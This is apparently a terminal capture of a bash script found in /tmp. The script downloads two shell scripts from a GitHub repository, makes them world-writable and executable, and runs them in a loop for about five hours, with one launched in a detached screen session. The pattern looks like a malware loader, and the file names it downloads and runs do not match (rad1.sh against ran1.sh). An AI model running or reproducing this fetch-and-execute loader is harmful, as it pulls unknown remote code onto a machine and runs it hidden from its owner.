# cat /tmp/testscript.sh
#!/bin/bash
ran1=$(openssl rand -base64 3)
ran2=$(openssl rand -base64 4)
wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh 
wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh 
runtime="301 minute"
endtime=$(date -ud "$runtime" +%s)

while [[ $(date -u +%s) -le $endtime ]]
do
        chmod 777 ran1.sh
	./ran1.sh
	sleep 5
	chmod 777 Sec.sh
	timeout 10m screen -dmS Sec.sh ./Sec.sh 65 75 
	sleep 5
done
